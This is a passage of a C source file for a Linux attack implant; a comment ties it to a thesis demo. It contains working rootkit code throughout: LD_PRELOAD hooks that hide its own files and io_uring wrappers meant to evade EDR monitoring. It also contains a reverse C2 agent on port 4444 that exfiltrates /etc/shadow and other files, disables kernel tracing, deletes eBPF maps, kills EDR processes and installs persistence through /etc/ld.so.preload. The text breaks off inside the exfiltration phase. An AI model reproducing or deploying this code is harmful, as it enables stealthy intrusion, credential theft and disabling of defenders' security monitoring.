#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>
#include <dlfcn.h>
#include <stdarg.h>
#include <ctype.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <utmp.h>
#include <liburing.h>

/* ============================================================
 * CONFIGURATION
 * ============================================================ */
#define HIDDEN_FILE     "evil.so"
#define HOOKS_FILENAME  "evasion_hooks.so"
#define OPS_FILENAME    "evasion_ops"
#define QUEUE_DEPTH     16
#define BUF_SIZE        65536
#define C2_PORT         4444
#define RECONNECT_TIME  5

/* ============================================================
 * is_hidden(): Check if path contains any hidden filename
 * Used by: ALL LD_PRELOAD hooks
 * Files hidden: evil.so, evasion_hooks.so, evasion_ops
 * ============================================================ */
static int is_hidden(const char *path) {
    if (!path) return 0;
    if (strstr(path, HIDDEN_FILE) != NULL) return 1;
    if (strstr(path, HOOKS_FILENAME) != NULL) return 1;
    if (strstr(path, OPS_FILENAME) != NULL) return 1;
    return 0;
}


/* ╔══════════════════════════════════════════════════════════════╗
 * ║  LD_PRELOAD HOOKS — 13 glibc functions                      ║
 * ║  Purpose: Hide files from userspace tools (ls, stat, cat...) ║
 * ║  Mechanism: dlsym(RTLD_NEXT) → call original, skip hidden    ║
 * ║  Only compiled when building hooks .so (not STANDALONE)      ║
 * ╚══════════════════════════════════════════════════════════════╝ */
#ifndef STANDALONE

/*
 * Hook 1: readdir()
 */
struct dirent *readdir(DIR *dirp) {
    struct dirent *(*orig)(DIR *) = dlsym(RTLD_NEXT, "readdir");
    struct dirent *entry;
    while ((entry = orig(dirp)) != NULL) {
        if (!is_hidden(entry->d_name)) return entry;
    }
    return NULL;
}

/*
 * Hook 2: readdir64()
 */
struct dirent64 *readdir64(DIR *dirp) {
    struct dirent64 *(*orig)(DIR *) = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *entry;
    while ((entry = orig(dirp)) != NULL) {
        if (!is_hidden(entry->d_name)) return entry;
    }
    return NULL;
}

/*
 * Hook 3: __xstat() — older glibc stat wrapper
 */
int __xstat(int ver, const char *path, struct stat *buf) {
    int (*orig)(int, const char *, struct stat *) = dlsym(RTLD_NEXT, "__xstat");
    if (is_hidden(path)) { errno = ENOENT; return -1; }
    return orig(ver, path, buf);
}

/*
 * Hook 4: __lxstat() — older glibc lstat wrapper
 */
int __lxstat(int ver, const char *path, struct stat *buf) {
    int (*orig)(int, const char *, struct stat *) = dlsym(RTLD_NEXT, "__lxstat");
    if (is_hidden(path)) { errno = ENOENT; return -1; }
    return orig(ver, path, buf);
}

/*
 * Hook 5: __fxstatat() — older glibc fstatat wrapper
 */
int __fxstatat(int ver, int dirfd, const char *path, struct stat *buf, int flags) {
    int (*orig)(int, int, const char *, struct stat *, int) = dlsym(RTLD_NEXT, "__fxstatat");
    if (is_hidden(path)) { errno = ENOENT; return -1; }
    return orig(ver, dirfd, path, buf, flags);
}

/*
 * Hook 6: stat() — newer glibc stat
 */
int stat(const char *path, struct stat *buf) {
    int (*orig)(const char *, struct stat *) = dlsym(RTLD_NEXT, "stat");
    if (is_hidden(path)) { errno = ENOENT; return -1; }
    return orig(path, buf);
}

/*
 * Hook 7: lstat() — newer glibc lstat
 */
int lstat(const char *path, struct stat *buf) {
    int (*orig)(const char *, struct stat *) = dlsym(RTLD_NEXT, "lstat");
    if (is_hidden(path)) { errno = ENOENT; return -1; }
    return orig(path, buf);
}

/*
 * Hook 8: fstatat() — newer glibc fstatat
 */
int fstatat(int dirfd, const char *path, struct stat *buf, int flags) {
    int (*orig)(int, const char *, struct stat *, int) = dlsym(RTLD_NEXT, "fstatat");
    if (is_hidden(path)) { errno = ENOENT; return -1; }
    return orig(dirfd, path, buf, flags);
}

/*
 * Hook 9: statx() — glibc 2.32+ (Kali, Ubuntu 22+, Debian 12+)
 */
int statx(int dirfd, const char *restrict path, int flags,
          unsigned int mask, struct statx *restrict buf) {
    int (*orig)(int, const char *restrict, int, unsigned int, struct statx *restrict) =
        dlsym(RTLD_NEXT, "statx");
    if (is_hidden(path)) { errno = ENOENT; return -1; }
    if (orig) return orig(dirfd, path, flags, mask, buf);
    return syscall(SYS_statx, dirfd, path, flags, mask, buf);
}

/*
 * Hook 10: access() — check file existence
 */
int access(const char *path, int mode) {
    int (*orig)(const char *, int) = dlsym(RTLD_NEXT, "access");
    if (is_hidden(path)) { errno = ENOENT; return -1; }
    return orig(path, mode);
}

/*
 * Hook 11: faccessat() — modern access check
 */
int faccessat(int dirfd, const char *path, int mode, int flags) {
    int (*orig)(int, const char *, int, int) = dlsym(RTLD_NEXT, "faccessat");
    if (is_hidden(path)) { errno = ENOENT; return -1; }
    return orig(dirfd, path, mode, flags);
}

/*
 * Hook 12: open() — file open
 */
int open(const char *path, int flags, ...) {
    int (*orig)(const char *, int, ...) = dlsym(RTLD_NEXT, "open");
    if (is_hidden(path)) { errno = ENOENT; return -1; }
    if (flags & O_CREAT) {
        va_list args; va_start(args, flags);
        mode_t mode = va_arg(args, mode_t); va_end(args);
        return orig(path, flags, mode);
    }
    return orig(path, flags);
}

/*
 * Hook 13: openat() — modern file open (used by most tools now)
 */
int openat(int dirfd, const char *path, int flags, ...) {
    int (*orig)(int, const char *, int, ...) = dlsym(RTLD_NEXT, "openat");
    if (is_hidden(path)) { errno = ENOENT; return -1; }
    if (flags & O_CREAT) {
        va_list args; va_start(args, flags);
        mode_t mode = va_arg(args, mode_t); va_end(args);
        return orig(dirfd, path, flags, mode);
    }
    return orig(dirfd, path, flags);
}

#endif /* STANDALONE */


/*
 * uring_open(): Open file via io_uring
 * Replaces: open(), openat() syscall
 * io_uring op: IORING_OP_OPENAT
 * EDR sees: NOTHING (no openat in /proc/pid/syscall)
 * strace: ZERO openat() entries
 */
static int uring_open(struct io_uring *ring, const char *path, int flags, int mode) {
    struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
    if (!sqe) return -1;
    io_uring_prep_openat(sqe, AT_FDCWD, path, flags, mode);
    io_uring_submit(ring);
    struct io_uring_cqe *cqe;
    io_uring_wait_cqe(ring, &cqe);
    int fd = cqe->res;
    io_uring_cqe_seen(ring, cqe);
    return fd;
}

/*
 * uring_close(): Close fd via io_uring
 */
static void uring_close(struct io_uring *ring, int fd) {
    struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
    if (!sqe) { close(fd); return; }
    io_uring_prep_close(sqe, fd);
    io_uring_submit(ring);
    struct io_uring_cqe *cqe;
    io_uring_wait_cqe(ring, &cqe);
    io_uring_cqe_seen(ring, cqe);
}

/*
 * uring_unlink(): Delete file via io_uring
 */
static int uring_unlink(struct io_uring *ring, const char *path) {
    struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
    if (!sqe) return -1;
    io_uring_prep_unlinkat(sqe, AT_FDCWD, path, 0);
    io_uring_submit(ring);
    struct io_uring_cqe *cqe;
    io_uring_wait_cqe(ring, &cqe);
    int ret = cqe->res;
    io_uring_cqe_seen(ring, cqe);
    return ret;
}

/*
 * uring_read_file(): Read entire file via io_uring (chunked)
 */
static int uring_read_file(struct io_uring *ring, const char *path,
                           char *buf, size_t buf_size) {
    int fd = uring_open(ring, path, O_RDONLY, 0);
    if (fd < 0) return fd;

    off_t offset = 0;
    size_t total = 0;
    while (total < buf_size - 1) {
        struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
        if (!sqe) break;
        io_uring_prep_read(sqe, fd, buf + total, buf_size - 1 - total, offset);
        io_uring_submit(ring);
        struct io_uring_cqe *cqe;
        io_uring_wait_cqe(ring, &cqe);
        int bytes = cqe->res;
        io_uring_cqe_seen(ring, cqe);
        if (bytes <= 0) break;
        offset += bytes;
        total += bytes;
    }
    buf[total] = '\0';
    uring_close(ring, fd);
    return total;
}

/*
 * uring_write_file(): Write to file via io_uring (chunked)
 */
static int uring_write_file(struct io_uring *ring, const char *path,
                            const char *data, size_t len, int flags) {
    int fd = uring_open(ring, path, O_WRONLY | O_CREAT | flags, 0644);
    if (fd < 0) return fd;

    off_t offset = 0;
    size_t total = 0;
    while (total < len) {
        struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
        if (!sqe) break;
        io_uring_prep_write(sqe, fd, data + total, len - total, offset);
        io_uring_submit(ring);
        struct io_uring_cqe *cqe;
        io_uring_wait_cqe(ring, &cqe);
        int bytes = cqe->res;
        io_uring_cqe_seen(ring, cqe);
        if (bytes <= 0) break;
        offset += bytes;
        total += bytes;
    }
    uring_close(ring, fd);
    return total;
}

/*
 * uring_write_to_fd(): Write to already-opened fd via io_uring
 */
static int uring_write_to_fd(struct io_uring *ring, int fd,
                             const char *data, size_t len, off_t offset) {
    struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
    if (!sqe) return -1;
    io_uring_prep_write(sqe, fd, data, len, offset);
    io_uring_submit(ring);
    struct io_uring_cqe *cqe;
    io_uring_wait_cqe(ring, &cqe);
    int ret = cqe->res;
    io_uring_cqe_seen(ring, cqe);
    return ret;
}

/*
 * uring_connect(): TCP connect via io_uring
 */
static int uring_connect(struct io_uring *ring, const char *ip, int port) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);  /* Only syscall we can't avoid */
    if (sockfd < 0) return -1;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);

    struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
    if (!sqe) { close(sockfd); return -1; }
    io_uring_prep_connect(sqe, sockfd, (struct sockaddr *)&addr, sizeof(addr));
    io_uring_submit(ring);
    struct io_uring_cqe *cqe;
    io_uring_wait_cqe(ring, &cqe);
    int ret = cqe->res;
    io_uring_cqe_seen(ring, cqe);
    if (ret < 0) { close(sockfd); return ret; }
    return sockfd;
}

/*
 * uring_send_all(): Reliable chunked send via io_uring
 */
static int uring_send_all(struct io_uring *ring, int sockfd,
                          const char *data, size_t len) {
    size_t sent = 0;
    while (sent < len) {
        struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
        if (!sqe) return -1;
        io_uring_prep_send(sqe, sockfd, data + sent, len - sent, 0);
        io_uring_submit(ring);
        struct io_uring_cqe *cqe;
        io_uring_wait_cqe(ring, &cqe);
        int ret = cqe->res;
        io_uring_cqe_seen(ring, cqe);
        if (ret <= 0) return ret;
        sent += ret;
    }
    return sent;
}

/*
 * uring_recv(): Receive data via io_uring
 */
static int uring_recv(struct io_uring *ring, int sockfd,
                      char *buf, size_t len) {
    struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
    if (!sqe) return -1;
    io_uring_prep_recv(sqe, sockfd, buf, len, 0);
    io_uring_submit(ring);
    struct io_uring_cqe *cqe;
    io_uring_wait_cqe(ring, &cqe);
    int ret = cqe->res;
    io_uring_cqe_seen(ring, cqe);
    if (ret > 0) buf[ret] = '\0';
    return ret;
}

/*
 * uring_statx_check(): Get file metadata via io_uring
 */
static int uring_statx_check(struct io_uring *ring, const char *path, struct statx *stx) {
    struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
    if (!sqe) return -1;
    io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, stx);
    io_uring_submit(ring);
    struct io_uring_cqe *cqe;
    io_uring_wait_cqe(ring, &cqe);
    int ret = cqe->res;
    io_uring_cqe_seen(ring, cqe);
    return ret;
}


/* ============================================================
 * PART 3: STANDALONE BINARY — 5 PHASES
 * ============================================================ */
#ifdef STANDALONE

/* ╔══════════════════════════════════════════════════════════════╗
 * ║  PHASE 1: io_uring Initialization — Create Blind Zone        ║
 * ║  io_uring_queue_init() → SQ/CQ shared memory with kernel     ║
 * ║  After this: ALL I/O goes through kernel worker threads       ║
 * ║  EDR syscall hooks see NOTHING from this point forward        ║
 * ╚══════════════════════════════════════════════════════════════╝ */
static void phase1_init(struct io_uring *ring) {
    /*printf("\n");
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║  PHASE 1: io_uring Initialization — Blind Zone           ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n");
    printf("[+] Ring initialized (queue_depth=%d)\n", QUEUE_DEPTH);
    printf("[+] SQ + CQ mapped in shared kernel memory\n");
    printf("[+] Kernel io-wq workers ready\n");
    printf("[+] EDR syscall hooks: BLIND from this point\n");
    printf("\n[*] io_uring coverage:\n");
    printf("    openat → io_uring_prep_openat  | close  → io_uring_prep_close\n");
    printf("    read   → io_uring_prep_read    | write  → io_uring_prep_write\n");
    printf("    unlink → io_uring_prep_unlinkat| statx  → io_uring_prep_statx\n");
    printf("    connect→ io_uring_prep_connect | send   → io_uring_prep_send\n");
    printf("    recv   → io_uring_prep_recv\n");*/
}


/* ╔══════════════════════════════════════════════════════════════╗
 * ║  PHASE 2: Stealth C2 Communication                          ║
 * ╚══════════════════════════════════════════════════════════════╝ */

/* Phase 2 Demo: single session for thesis presentation */
static void phase2_c2_demo(struct io_uring *ring, const char *c2_ip) {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║  PHASE 2: Stealth C2 Demo — io_uring network             ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n");
    printf("[*] Target: %s:%d\n", c2_ip, C2_PORT);

    int sockfd = uring_connect(ring, c2_ip, C2_PORT);
    if (sockfd < 0) {
        printf("[-] Connect FAILED (error=%d)\n", sockfd);
        printf("[*] → Terminal 1: nc -lvnp %d\n", C2_PORT);
        printf("[*] → Terminal 2: ./evasion_ops connect <IP>\n");
        return;
    }
    printf("[+] Connected! fd=%d — ZERO connect() syscall\n", sockfd);

    const char *msg = "[io_uring C2] EDR cannot see this traffic\n";
    int sent = uring_send_all(ring, sockfd, msg, strlen(msg));
    printf("[+] Sent %d bytes — ZERO send() syscall\n", sent);

    char recv_buf[BUF_SIZE];
    printf("[*] Waiting for response...\n");
    int received = uring_recv(ring, sockfd, recv_buf, BUF_SIZE - 1);
    if (received > 0)
        printf("[+] Received %d bytes: %s\n", received, recv_buf);

    uring_close(ring, sockfd);
    printf("[+] Socket closed via io_uring\n");
}

/* Phase 2 Full: C2 command loop with auto-reconnect */
static void phase2_c2_loop(struct io_uring *ring, const char *c2_ip) {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║  PHASE 2: C2 Command Loop — Auto-reconnect               ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n");

    while (1) {
        printf("[*] Connecting to %s:%d...\n", c2_ip, C2_PORT);
        int sockfd = uring_connect(ring, c2_ip, C2_PORT);
        if (sockfd < 0) {
            printf("[-] Failed, retry in %ds...\n", RECONNECT_TIME);
            sleep(RECONNECT_TIME);
            continue;
        }

        printf("[+] Connected! Entering command loop...\n");
        const char *banner = "[agent] io_uring agent ready — type 'help'\n";
        uring_send_all(ring, sockfd, banner, strlen(banner));

        char cmd_buf[BUF_SIZE];
        while (1) {
            uring_send_all(ring, sockfd, "agent> ", 7);
            int n = uring_recv(ring, sockfd, cmd_buf, BUF_SIZE - 1);
            if (n <= 0) { printf("[-] Connection lost\n"); break; }

            /* Sanitize */
            while (n > 0 && (cmd_buf[n-1] == '\n' || cmd_buf[n-1] == '\r'))
                cmd_buf[--n] = '\0';
            if (n == 0) continue;

            char resp[BUF_SIZE];
            int rlen = 0;

            if (strcmp(cmd_buf, "help") == 0) {
                rlen = snprintf(resp, sizeof(resp),
                    "Commands:\n"
                    "  recon-users     Logged-in users (utmp)\n"
                    "  recon-network   TCP connections (/proc/net/tcp)\n"
                    "  recon-files     Exfiltrate sensitive files\n"
                    "  privesc         SUID binary scan (statx)\n"
                    "  killbpf         Disable tracing + kill eBPF/EDR\n"
                    "  persist         Install LD_PRELOAD persistence\n"
                    "  get <path>      Download file\n"
                    "  hide-check      Verify file hiding\n"
                    "  selfdestruct    Delete binary + exit\n"
                    "  exit            Disconnect\n");
            }
            else if (strcmp(cmd_buf, "recon-users") == 0) {
                char ub[8192];
                int ret = uring_read_file(ring, "/var/run/utmp", ub, sizeof(ub));
                if (ret > 0) {
                    int cnt = ret / sizeof(struct utmp);
                    struct utmp *e = (struct utmp *)ub;
                    rlen = snprintf(resp, sizeof(resp), "Logged-in users:\n");
                    for (int i = 0; i < cnt && rlen < (int)sizeof(resp) - 100; i++) {
                        if (e[i].ut_type == USER_PROCESS)
                            rlen += snprintf(resp + rlen, sizeof(resp) - rlen,
                                "  %-12s %-8s %-16s\n",
                                e[i].ut_user, e[i].ut_line, e[i].ut_host);
                    }
                } else {
                    rlen = snprintf(resp, sizeof(resp), "[-] Cannot read utmp\n");
                }
            }
            else if (strcmp(cmd_buf, "recon-network") == 0) {
                char tb[8192];
                int ret = uring_read_file(ring, "/proc/net/tcp", tb, sizeof(tb));
                if (ret > 0) {
                    rlen = snprintf(resp, sizeof(resp),
                        "TCP Connections:\n%-22s %-22s %-6s %-6s\n",
                        "Local", "Remote", "State", "UID");
                    char *line = strtok(tb, "\n");
                    line = strtok(NULL, "\n");
                    while (line && rlen < (int)sizeof(resp) - 200) {
                        unsigned int sl, li, lp, ri, rp, st, uid;
                        if (sscanf(line, "%u: %8X:%X %8X:%X %X %*s %*s %*s %u",
                                   &sl, &li, &lp, &ri, &rp, &st, &uid) >= 6) {
                            char ls[32], rs[32];
                            snprintf(ls, sizeof(ls), "%d.%d.%d.%d:%d",
                                     li&0xFF, (li>>8)&0xFF, (li>>16)&0xFF, (li>>24)&0xFF, lp);
                            snprintf(rs, sizeof(rs), "%d.%d.%d.%d:%d",
                                     ri&0xFF, (ri>>8)&0xFF, (ri>>16)&0xFF, (ri>>24)&0xFF, rp);
                            rlen += snprintf(resp+rlen, sizeof(resp)-rlen,
                                "%-22s %-22s %-6X %-6u\n", ls, rs, st, uid);
                        }
                        line = strtok(NULL, "\n");
                    }
                } else {
                    rlen = snprintf(resp, sizeof(resp), "[-] Cannot read /proc/net/tcp\n");
                }
            }
            else if (strcmp(cmd_buf, "recon-files") == 0) {
                const char *t[] = {"/etc/passwd","/etc/shadow","/etc/hostname",
                                   "/etc/ssh/sshd_config","/root/.bash_history",NULL};
                rlen = snprintf(resp, sizeof(resp), "Exfiltration:\n");
                for (int i = 0; t[i]; i++) {
                    char fb[4096];
                    int b = uring_read_file(ring, t[i], fb, sizeof(fb));
                    rlen += snprintf(resp+rlen, sizeof(resp)-rlen,
                        b > 0 ? "[+] %s (%d bytes)\n" : "[-] %s (denied)\n", t[i], b);
                }
            }
            else if (strcmp(cmd_buf, "privesc") == 0) {
                const char *dirs[] = {"/usr/bin","/usr/sbin","/bin","/sbin",NULL};
                rlen = snprintf(resp, sizeof(resp), "SUID binaries:\n");
                for (int d = 0; dirs[d]; d++) {
                    DIR *dir = opendir(dirs[d]);
                    if (!dir) continue;
                    struct dirent *de;
                    while ((de = readdir(dir)) != NULL) {
                        if (de->d_name[0] == '.') continue;
                        char p[512];
                        snprintf(p, sizeof(p), "%s/%s", dirs[d], de->d_name);
                        struct statx sx;
                        if (uring_statx_check(ring, p, &sx) == 0 && (sx.stx_mode & S_ISUID))
                            rlen += snprintf(resp+rlen, sizeof(resp)-rlen,
                                "[+] %s (uid=%u)\n", p, sx.stx_uid);
                        if (rlen > (int)sizeof(resp) - 200) break;
                    }
                    closedir(dir);
                }
            }
            else if (strcmp(cmd_buf, "killbpf") == 0) {
                rlen = snprintf(resp, sizeof(resp), "=== REAPER ===\n");
                const char *tf[] = {"/sys/kernel/debug/tracing/tracing_on",
                                    "/sys/kernel/debug/tracing/set_event",
                                    "/sys/kernel/debug/tracing/current_tracer",NULL};
                for (int i = 0; tf[i]; i++) {
                    int fd = uring_open(ring, tf[i], O_WRONLY, 0);
                    if (fd < 0) continue;
                    uring_write_to_fd(ring, fd, "0", 1, 0);
                    uring_close(ring, fd);
                    rlen += snprintf(resp+rlen, sizeof(resp)-rlen,
                        "[+] Tracing off: %s\n", tf[i]);
                }
                DIR *bpf = opendir("/sys/fs/bpf");
                if (bpf) {
                    struct dirent *be;
                    while ((be = readdir(bpf)) != NULL) {
                        if (be->d_name[0] == '.') continue;
                        char bp[512];
                        snprintf(bp, sizeof(bp), "/sys/fs/bpf/%s", be->d_name);
                        if (uring_unlink(ring, bp) == 0)
                            rlen += snprintf(resp+rlen, sizeof(resp)-rlen,
                                "[+] Deleted BPF: %s\n", bp);
                    }
                    closedir(bpf);
                }
                DIR *proc = opendir("/proc");
                if (proc) {
                    struct dirent *pe;
                    while ((pe = readdir(proc)) != NULL) {
                        if (!isdigit(pe->d_name[0])) continue;
                        char mp[256]; char mb[16384];
                        snprintf(mp, sizeof(mp), "/proc/%s/maps", pe->d_name);
                        int rb = uring_read_file(ring, mp, mb, sizeof(mb));
                        if (rb > 0 && strstr(mb, "anon_inode:bpf-map")) {
                            pid_t pid = atoi(pe->d_name);
                            if (pid > 1 && kill(pid, SIGKILL) == 0)
                                rlen += snprintf(resp+rlen, sizeof(resp)-rlen,
                                    "[+] Killed EDR PID=%d\n", pid);
                        }
                        if (rlen > (int)sizeof(resp) - 256) break;
                    }
                    closedir(proc);
                }
            }
            else if (strcmp(cmd_buf, "persist") == 0) {
                char cwd_buf[512], hp[1024];
                getcwd(cwd_buf, sizeof(cwd_buf));
                snprintf(hp, sizeof(hp), "%s/%s\n", cwd_buf, HOOKS_FILENAME);
                int ret = uring_write_file(ring, "/etc/ld.so.preload", hp, strlen(hp), O_TRUNC);
                rlen = snprintf(resp, sizeof(resp), ret > 0 ?
                    "[+] /etc/ld.so.preload written — hooks active\n" :
                    "[-] Need root for /etc/ld.so.preload\n");
            }
            else if (strncmp(cmd_buf, "get ", 4) == 0) {
                char *fp = cmd_buf + 4;
                while (*fp == ' ') fp++;
                char fb[BUF_SIZE];
                int b = uring_read_file(ring, fp, fb, sizeof(fb));
                if (b > 0) {
                    char hdr[256];
                    int hl = snprintf(hdr, sizeof(hdr), "=== %s (%d bytes) ===\n", fp, b);
                    uring_send_all(ring, sockfd, hdr, hl);
                    uring_send_all(ring, sockfd, fb, b);
                    rlen = snprintf(resp, sizeof(resp), "\n=== EOF ===\n");
                } else {
                    rlen = snprintf(resp, sizeof(resp), "[-] Cannot read %s\n", fp);
                }
            }
            else if (strcmp(cmd_buf, "hide-check") == 0) {
                char pb[BUF_SIZE];
                int pbb = uring_read_file(ring, "/etc/ld.so.preload", pb, BUF_SIZE);
                rlen = snprintf(resp, sizeof(resp),
                    (pbb > 0 && strstr(pb, HOOKS_FILENAME)) ?
                    "[+] Persistence ACTIVE\n" : "[-] No persistence\n");
            }
            else if (strcmp(cmd_buf, "selfdestruct") == 0) {
                uring_send_all(ring, sockfd, "[!] Self-destructing...\n", 24);
                char el[512];
                ssize_t elen = readlink("/proc/self/exe", el, sizeof(el)-1);
                if (elen > 0) { el[elen] = '\0'; uring_unlink(ring, el); }
                uring_close(ring, sockfd);
                io_uring_queue_exit(ring);
                _exit(0);
            }
            else if (strcmp(cmd_buf, "exit") == 0) {
                uring_send_all(ring, sockfd, "[*] Disconnecting...\n", 21);
                uring_close(ring, sockfd);
                return;
            }
            else {
                rlen = snprintf(resp, sizeof(resp), "[-] Unknown: %s — type 'help'\n", cmd_buf);
            }

            if (rlen > 0) uring_send_all(ring, sockfd, resp, rlen);
        }

        printf("[*] Reconnecting in %ds...\n", RECONNECT_TIME);
        sleep(RECONNECT_TIME);
    }
}


/* ╔══════════════════════════════════════════════════════════════╗
 * ║  PHASE 3: REAPER — Neutralize ALL monitoring                 ║
 * ║  3a: Disable Ftrace/DebugFS kernel tracing                   ║
 * ║  3b: Delete eBPF maps from /sys/fs/bpf/                     ║
 * ║  3c: Kill processes using bpf-map (EDR agents)               ║
 * ╚══════════════════════════════════════════════════════════════╝ */

/*
 * 3a: Disable kernel tracing
 */
static void phase3_disable_tracing(struct io_uring *ring) {
    printf("\n  -- 3a: Disable Kernel Tracing --\n");
    const char *targets[] = {
        "/sys/kernel/debug/tracing/tracing_on",
        "/sys/kernel/debug/tracing/set_event",
        "/sys/kernel/debug/tracing/current_tracer",
        NULL
    };
    for (int i = 0; targets[i]; i++) {
        int fd = uring_open(ring, targets[i], O_WRONLY, 0);
        if (fd < 0) {
            printf("    [-] %s (need root?)\n", targets[i]);
            continue;
        }
        uring_write_to_fd(ring, fd, "0", 1, 0);
        uring_close(ring, fd);
        printf("    [+] Disabled: %s\n", targets[i]);
    }
}

/*
 * 3b: Destroy eBPF maps
 */
static void phase3_destroy_ebpf(struct io_uring *ring) {
    printf("\n  -- 3b: Destroy eBPF Maps --\n");
    DIR *dir = opendir("/sys/fs/bpf");
    if (!dir) { printf("    [-] Cannot open /sys/fs/bpf/\n"); return; }

    int deleted = 0;
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_name[0] == '.') continue;
        char path[512];
        snprintf(path, sizeof(path), "/sys/fs/bpf/%s", entry->d_name);
        if (uring_unlink(ring, path) == 0) {
            printf("    [+] Deleted: %s\n", path);
            deleted++;
        }
    }
    closedir(dir);
    printf("    [*] %d BPF maps deleted\n", deleted);
}

/*
 * 3c: Hunt and kill EDR processes
 */
static void phase3_kill_edr(struct io_uring *ring) {
    printf("\n  -- 3c: Hunt & Kill EDR Processes --\n");
    DIR *proc = opendir("/proc");
    if (!proc) { printf("    [-] Cannot open /proc\n"); return; }

    int killed = 0, scanned = 0;
    struct dirent *entry;
    while ((entry = readdir(proc)) != NULL) {
        if (!isdigit(entry->d_name[0])) continue;
        long pid = strtol(entry->d_name, NULL, 10);
        if (pid <= 1) continue;

        char maps_path[256];
        snprintf(maps_path, sizeof(maps_path), "/proc/%ld/maps", pid);
        char maps_buf[16384];
        int bytes = uring_read_file(ring, maps_path, maps_buf, sizeof(maps_buf));
        if (bytes <= 0) continue;
        scanned++;

        if (strstr(maps_buf, "anon_inode:bpf-map")) {
            char comm_path[256], comm[256];
            snprintf(comm_path, sizeof(comm_path), "/proc/%ld/comm", pid);
            int cb = uring_read_file(ring, comm_path, comm, sizeof(comm));
            if (cb > 0) { char *nl = strchr(comm,'\n'); if(nl) *nl='\0'; }
            else strcpy(comm, "unknown");

            printf("    [!] EDR: PID=%ld (%s)\n", pid, comm);
            if (kill((pid_t)pid, SIGKILL) == 0) {
                printf("    [+] KILLED PID=%ld\n", pid);
                killed++;
            } else {
                printf("    [-] Kill failed: %s\n", strerror(errno));
            }
        }
    }
    closedir(proc);
    printf("    [*] Scanned %d, killed %d EDR agents\n", scanned, killed);
}

/* Phase 3 combined */
static void phase3_reaper(struct io_uring *ring) {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║  PHASE 3: REAPER — Neutralize Monitoring                 ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n");
    phase3_disable_tracing(ring);
    phase3_destroy_ebpf(ring);
    phase3_kill_edr(ring);
    printf("\n[+] REAPER complete\n");
}


/* ╔══════════════════════════════════════════════════════════════╗
 * ║  PHASE 4: Reconnaissance + Privilege Escalation              ║
 * ║  4a: Logged users (utmp via io_uring)                        ║
 * ║  4b: TCP connections (/proc/net/tcp via io_uring)            ║
 * ║  4c: Sensitive file exfiltration (io_uring)                  ║
 * ║  4d: SUID binary scan (io_uring statx)                       ║
 * ╚══════════════════════════════════════════════════════════════╝ */

/* 4a: Who is logged in? Read /var/run/utmp via io_uring */
static void phase4_recon_users(struct io_uring *ring) {
    printf("\n  -- 4a: Logged-in Users (utmp) --\n");
    char buf[8192];
    int ret = uring_read_file(ring, "/var/run/utmp", buf, sizeof(buf));
    if (ret <= 0) { printf("    [-] Cannot read utmp\n"); return; }

    int count = ret / sizeof(struct utmp);
    struct utmp *entries = (struct utmp *)buf;
    int found = 0;
    printf("    %-12s %-8s %-16s\n", "USER", "TTY", "HOST");
    for (int i = 0; i < count; i++) {
        if (entries[i].ut_type == USER_PROCESS) {
            printf("    %-12s %-8s %-16s\n",
                   entries[i].ut_user, entries[i].ut_line, entries[i].ut_host);
            found++;
        }
    }
    printf("    [*] %d sessions — ZERO read() syscalls\n", found);
}

/* 4b: What network connections exist? Read /proc/net/tcp via io_uring */
static void phase4_recon_network(struct io_uring *ring) {
    printf("\n  -- 4b: TCP Connections (/proc/net/tcp) --\n");
    char buf[8192];
    int ret = uring_read_file(ring, "/proc/net/tcp", buf, sizeof(buf));
    if (ret <= 0) { printf("    [-] Cannot read\n"); return; }

    printf("    %-22s %-22s %-6s %-6s\n", "Local", "Remote", "State", "UID");
    int conn = 0;
    char *line = strtok(buf, "\n");
    line = strtok(NULL, "\n");
    while (line) {
        unsigned int sl, li, lp, ri, rp, st, uid;
        if (sscanf(line, "%u: %8X:%X %8X:%X %X %*s %*s %*s %u",
                   &sl, &li, &lp, &ri, &rp, &st, &uid) >= 6) {
            char ls[32], rs[32];
            snprintf(ls, sizeof(ls), "%d.%d.%d.%d:%d",
                     li&0xFF,(li>>8)&0xFF,(li>>16)&0xFF,(li>>24)&0xFF,lp);
            snprintf(rs, sizeof(rs), "%d.%d.%d.%d:%d",
                     ri&0xFF,(ri>>8)&0xFF,(ri>>16)&0xFF,(ri>>24)&0xFF,rp);
            printf("    %-22s %-22s %-6X %-6u\n", ls, rs, st, uid);
            conn++;
        }
        line = strtok(NULL, "\n");
    }
    printf("    [*] %d connections — ZERO syscalls\n", conn);
}

/* 4c: Exfiltrate sensitive files via io_uring */
static void phase4_exfiltration(struct io_uring *ring) {
    printf("\n  -- 4c: Sensitive File Exfiltration --\n");
    char buf[BUF_SIZE];
    const char *targets[] = {
        "/etc/passwd", "/etc/shadow", "/etc/ssh/sshd_config",
        "/root/.bash_history", "/etc/hostname",
        "/etc/crontab", "/etc/sudoers", NULL
    };
